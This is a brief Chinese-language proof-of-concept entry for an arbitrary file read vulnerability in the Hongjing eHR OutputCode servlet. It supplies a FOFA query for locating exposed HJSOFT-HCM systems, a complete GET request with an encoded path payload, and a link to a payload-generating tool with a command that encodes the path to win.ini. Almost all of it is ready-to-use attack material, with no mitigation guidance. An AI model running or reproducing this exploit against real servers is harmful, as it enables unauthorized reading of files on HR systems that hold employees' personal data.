## 宏景eHR-OutputCode存在任意文件读取漏洞



## fofa

```
app="HJSOFT-HCM"
```



## poc

```
GET /servlet/OutputCode?path=MrEzLLE8pPjFvPfyPAATTP2HJFPAATTPTwqF7eJiXGeHU4B HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
```

![image-20240523192106336](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405231921421.png)



payload生成工具

工具地址：https://github.com/vaycore/HrmsTool/releases/tag/0.1

```
java -jar HrmsTool.jar -e c:/Windows/win.ini
```

![image-20240523192205181](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405231922223.png)